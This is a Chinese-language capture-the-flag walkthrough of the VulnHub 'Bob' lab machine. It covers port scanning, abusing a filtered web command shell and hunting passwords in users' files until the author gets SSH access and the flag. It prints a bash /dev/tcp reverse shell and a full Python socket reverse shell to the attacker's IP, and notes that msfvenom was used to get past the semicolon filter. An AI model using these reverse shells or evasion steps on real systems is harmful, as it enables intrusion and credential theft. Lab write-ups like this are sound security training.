靶机镜像下载地址： https://download.vulnhub.com/bob/Bob\_v1.0.1.ova

Bob 靶机 IP ：196.168.10.129

# 信息收集

先使用 `nmap -sP 196.168.10.0/24` ，扫描同一网段下存活的主机。  
![](../Images/42fcb8d3fe2db95acb5da9597990824c.png)  
发现靶机 IP 196.168.10.129。  
接下来使用 `nmap -sS 196.168.10.129` ,扫描靶机的开放端口。  
![](../Images/fa9a1df4059a26092af4b66521146217.png)  
只开放了一个 80 端口，直接访问。  
![](../Images/9b9eef1096900cb75c4c904211fac3b0.png)  
看上去是某个学校的主页。点击“ News”，来了解下这个学校最近发生了什么事？  
![](../Images/3a4dae3e2d1e8901a0bab00467fcd8fd.png)  
这条最近的新闻大概说的是：最近学校被黑客入侵造成了一定的混乱，而校方采取了雇佣新的 IT 人员和禁止外部登陆的手段来处理这次事件。  
我们点击“Login”，果然外部登陆被禁止了。  
![](../Images/d94032ab67ce42042c991253efe61c81.png)  
再从“ Contact Us”中了解下 IT 部门。  
![](../Images/2e6cb59f196b6a9f525442dd3cd0884b.png)  
我们的主角 Bob 正在其中。  
至此，我们对这个靶机已有了一个大概的认识，接下来将进行更深一步的探索。

使用御剑对其后台进行扫描。

# 反弹 shell

回到“dev\_shell.php”，尝试用命令 `ls` ，回显 `Get out skid lol` 。看来一些命令是被 ban 掉了。

## bash 反弹

接下来尝试反弹 shell 。在主机上使用`nc -lvp 80`开启监听，尝试用 bash 反弹：`bash -i >& /dev/tcp/196.168.10.128/80 0>&1` ，主机没有回显，同时网页也没有警告，猜测是没有权限执行。

## python 反弹

使用 `whereis python` 判断是否有 python 环境。  
![](../Images/6e86a667766ecc60a641f98380165c63.png)  
nice ！python 反弹一句话：

```
python \-c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("196.168.10.128",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
```

![](../Images/a6294973460b998940d263ecb9a94ac9.png)  
又被过滤了，猜测其过虑了什么？经过多次实验发现是“;”被过滤了。  
![](../Images/7364911b5787b7bc535820934a5258f2.png)  
那我们就用 `msfvenom` 获取没有“;”的反弹一句话。  
![](../Images/838a108242596d43a7a2ead8d2df081f.png)  
再使用 `python -c 'import pty; pty.spawn("/bin/bash")'` 使页面变得更好看  
![](../Images/5b72a2b840e44822e05841adb2ee1a74.png)  
使用命令 `ls -la` 我们还可以看到“dev\_shell.php”页面同时存在源码泄露。  
![](../Images/ec5e86e9845a2c8b27cc74e9bba804c2.png)  
通过分析源码我们还可以获得更多的利用姿势，不过在这里就不细述了。

# 寻找 flag

在本机目录下查看发现了 flag.txt ，很显然要 root 权限才能查看。  
![](../Images/c2fa1f6dff5da3dd8f43c52826b2a2f6.png)  
接下来就是不断地寻找了，在 `home` 目录下我们看到了 bob 的文件夹，而其它三个则是 IT 部门中的其他三个成员。  
进入 bob 文件目录，我们在 `Document` 下发现了有意思的东西：  
![](../Images/e8c26cd5e49caa649bf16934ae87bac7.png)  
“login.txt.gpg”是一个加密的 txt 文件，使用 `gpg -d login.txt.gpg` 尝试解码。  
![](../Images/8b0e6e4b7bfbf29d3e9cd095887ebed4.png)  
看来我们现在并没有权限使用命令 `gpg` ，所以我们继续查看其他文件。  
“staff.txt”记录了 bob 对其他几个员工的看法：  
![](../Images/6f152a11dbb72ed475579d8a8393fb87.png)  
看起来 Elliot 好像很喜欢和 Bob 对着干，我们等下可以去他的文件目录下看看。  
Secrect 目录一路直下，最后在 notes.sh 中发现了一首藏头诗：  
![](../Images/bfe3cffbffb41bfad22259528e6a6aeb.png)  
并提出密码“HARPOCRATES”。推测是之前“login.txt.gpg”的密码。

## 寻找用户

进入 Elliot 的目录，一眼就看到了“theadminisdumb.txt”，打开查看。  
![](../Images/6f49e6cda09d22fbf97af79034898354.png)  
这个 Elliot 看不起 Bob 并将自己的密码改为了：theadminisdumb 。  
使用命令 `su` 登陆用户，用 `gpg` 解锁之前的“login.txt.gpg”依旧出现了警告“gpg: decrypt\_message failed: No such file or directory”，难道是因为反弹会话窗口功能不足的问题吗？既然有了用户账号那会不会有 ssh 服务呢？  
使用 `nmap -p- -sV 196.168.10.129` 对靶机端口进行更详细的扫描：![](../Images/f4480da060220b1e17a61b5ec783f5ca.png)  
成功在25467端口发现了 ssh 服务！使用 ssh 登陆用户：  
![](../Images/26c40b9c210068b2521fe54d51d8b802.png)

## get flag

用之前的密码解锁“login.txt.gpg”，得到 bob 的密码。  
![](../Images/923818a783c22ab2d48254223abbe616.png)  
登陆 bob 账号成功 get flag 。  
![](../Images/f97d7ed2fb1cd89873371ab2f1b3c7af.png)
